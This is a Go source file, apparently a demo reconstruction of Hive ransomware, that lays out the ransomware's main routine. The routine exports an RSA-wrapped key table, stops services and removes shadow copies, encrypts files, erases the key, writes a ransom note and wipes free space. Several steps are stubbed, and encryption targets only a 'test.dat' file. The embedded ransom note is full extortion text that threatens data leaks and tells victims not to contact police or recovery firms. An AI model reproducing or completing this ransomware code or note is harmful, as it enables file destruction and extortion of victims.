package hive


import (
  "runtime"
  "os"
  "time"
  "path/filepath"
  mathrand "math/rand"
  "crypto/x509"
  "crypto/rsa"
  "encoding/base64"
  "regexp"
  "log"
  "hive_v4_demo/keytab"
  "hive_v4_demo/config"
)


// HiveContext structure
type HiveContext struct {
  KeyTab *keytab.EncryptionKeyTab
  RansomExt string
  RansomNoteName string
  RansomNote string
  FileSkipList string
  NumWorkers int
  CmdArgs []string
  FileSkipRegexp *regexp.Regexp
  SkipRegexp *regexp.Regexp
  EncSkipRegexp *regexp.Regexp
  ServiceStopList string
  ProcessKillList string
  Grant bool
  ProcessKillRegexp *regexp.Regexp
  ServiceStopRegexp *regexp.Regexp
}


// File name channel buffer size
const FilenameChanBufSize = 50000


// Hive main function
func (ctx *HiveContext) RunProcess() error {

  // Hive initialization
  err := ctx.Init()
  if err != nil {
    return err
  }

  // Export key table
  err = ctx.ExportKey()
  if err != nil {
    return err
  }

  // Stop services, kill processes. grant permissions
  ctx.Preprocess()

  ctx.PreNotify()

  // Scan files
  c := ctx.ScanFiles()

  // Encrypt files
  ctx.EncryptFiles(c)

  // Erase key
  ctx.EraseKey()

  ctx.Notify()

  // Wipe spaces
  ctx.WipeSpaces()

  ctx.Postprocess()

  return nil
}


// Hive initialization
func (ctx *HiveContext) Init() error {

  mathrand.Seed(time.Now().UnixNano())

  // Generate key table
  ctx.KeyTab = keytab.GenKeyTab()

  // Compile regexps
  ctx.ServiceStopRegexp, _ = regexp.Compile("(?i:" +
                                            ctx.ServiceStopList +
                                            ")")
  ctx.ProcessKillRegexp, _ = regexp.Compile("(?i:" +
                                            ctx.ProcessKillList +
                                            ")")

  if ctx.FileSkipList == "" {
    ctx.FileSkipList = "^$"
  }

  ctx.NumWorkers = 96
  if runtime.NumCPU() < 6 {
    ctx.NumWorkers = 10
  }

  ctx.RansomExt = config.RansomExt()

  ctx.RansomNoteName = config.RansomNoteName()

  ctx.EncSkipRegexp = regexp.MustCompile("(.+)\\.(.+?)\\." +
                                         config.RansomExt() +
                                         "$")

  ctx.RansomNote =
    "Your network has been breached and all data were encrypted.\r\n" +
    "Personal data, financial reports and important documents are ready to disclose.\r\n" +
    "\r\n" +
    "To decrypt all the data and to prevent exfiltrated files to be disclosed at \r\n" +
    config.DLSUrl() + "\r\n" +
    "you will need to purchase our decryption software.\r\n" +
    "\r\n" +
    "Please contact our sales department at:\r\n" +
    "\r\n" +
    "   " + config.SalesDeptUrl() + "\r\n" +
    "  \r\n" +
    "      Login:    " + config.Login() + "\r\n" +
    "      Password: " + config.Password() + "\r\n" +
    "\r\n" +
    "To get an access to .onion websites download and install Tor Browser at:\r\n" +
    "   https://www.torproject.org/ (Tor Browser is not related to us)\r\n" +
    "\r\n" +
    "\r\n" +
    "Follow the guidelines below to avoid losing your data:\r\n" +
    "\r\n" +
    " - Do not modify, rename or delete *.key." + config.RansomExt() +
    " files. Your data will be \r\n" +
    "   undecryptable.\r\n" +
    " - Do not modify or rename encrypted files. You will lose them.\r\n" +
    " - Do not report to the Police, FBI, etc. They don't care about your business.\r\n" +
    "   They simply won't allow you to pay. As a result you will lose everything.\r\n" +
    " - Do not hire a recovery company. They can't decrypt without the key. \r\n" +
    "   They also don't care about your business. They believe that they are \r\n" +
    "   good negotiators, but it is not. They usually fail. So speak for yourself.\r\n" +
    " - Do not reject to purchase. Exfiltrated files will be publicly disclosed.\r\n"

  return nil
}


// Export key table
func (ctx *HiveContext) ExportKey() error {

  log.Println("Exporting key")

  // Import RSA public keys
  pubKeys := ImportRSAPubKeys()

  // Encrypt key table
  encKeyTab := ctx.KeyTab.Export(pubKeys)

  keyNameData := append(ctx.KeyTab.Hash, 0xFF)

  keyName := base64.URLEncoding.EncodeToString(keyNameData)

  keyFileName := keyName + ".key." + ctx.RansomExt

  // Save encrypted key table to file
  f, err := os.OpenFile(keyFileName, os.O_RDWR | os.O_CREATE | os.O_TRUNC,
                        0666)
  if err != nil {

    log.Printf("!export %s (%s)", keyFileName, err.Error())

    return err
  }

  defer f.Close()

  _, err = f.Write(encKeyTab)
  if err != nil {

    log.Printf("!export %s (%s)", keyFileName, err.Error())

    return err
  }

  log.Printf("+export %s", keyFileName)

  return nil
}


// Stop services, kill processes. grant permissions
func (ctx *HiveContext) Preprocess() {

  // Stop services
  ctx.StopServices()

  // Kill processes
  ctx.KillProcesses()

  if ctx.Grant {
    // Grant permissions
    ctx.GrantPermissions()
  }
}


// StopServices
func (ctx *HiveContext) StopServices() {

  log.Println("Stopping services")

  log.Println("Removing shadow copies")

  // ...
}


// Kill processes
func (ctx *HiveContext) KillProcesses() {

  log.Println("Killing processes")

  // ...
}


// Grant permissions
func (ctx *HiveContext) GrantPermissions() {

  log.Println("Granting permissions")

  // ...
}


func (ctx *HiveContext) PreNotify() {
  // ...
}



// Scan files
func (ctx *HiveContext) ScanFiles() <- chan string {

  log.Println("Scanning files")

  c := make(chan string, FilenameChanBufSize)

  // ...

  return c
}


// Encrypt files
func (ctx *HiveContext) EncryptFiles(c <- chan string) {

  log.Println("Encrypting files")

  filePath, err := filepath.Abs("test.dat")
  if err != nil {
    filePath = "test.dat"
  }

  t1 := time.Now()

  log.Printf("%%encrypt %s", filePath)

  // Encrypt file
  err = ctx.KeyTab.EncryptFilename(filePath, ctx.RansomExt)
  if err == nil {

    t2 := time.Now()
    elapsed := t2.Sub(t1)
    log.Printf("+encrypt %s %s", filePath, elapsed)

  } else {

    log.Printf("!encrypt %s (%s)", filePath, err.Error())
  }
}


// Erase key
func (ctx *HiveContext) EraseKey() {

  log.Println("Erasing key")

  // Erase key table
  ctx.KeyTab.Erase()
}


func (ctx *HiveContext) Notify() {

  log.Println("Notifying")

  // Save ransom note
  ransomNotePath, err := filepath.Abs(ctx.RansomNoteName)
  if err != nil {
    ransomNotePath = ctx.RansomNoteName
  }

  if _, err := os.Stat(ransomNotePath); !os.IsNotExist(err) {
    return
  }

  f, err := os.OpenFile(ransomNotePath, os.O_RDWR | os.O_CREATE | os.O_TRUNC,
                        0666)

  defer f.Close()

  if err == nil {
    _, err = f.Write([]byte(ctx.RansomNote))
    if err == nil {
      log.Printf("+notify %s", ransomNotePath)
    }
  }
}


// Wipe spaces
func (ctx *HiveContext) WipeSpaces() {
  //...
}


func (ctx *HiveContext) Postprocess() {

  log.Println("Erasing memory")

  //...
}


// Import RSA public keys
func ImportRSAPubKeys() []*rsa.PublicKey {

  var pubKeys []*rsa.PublicKey

  for i := 0; i < len(config.RSAPubKeyDerDataList); i++ {

    pubKey, _ := x509.ParsePKCS1PublicKey(config.RSAPubKeyDerDataList[i])

    pubKeys = append(pubKeys, pubKey)
  }

  return pubKeys
}
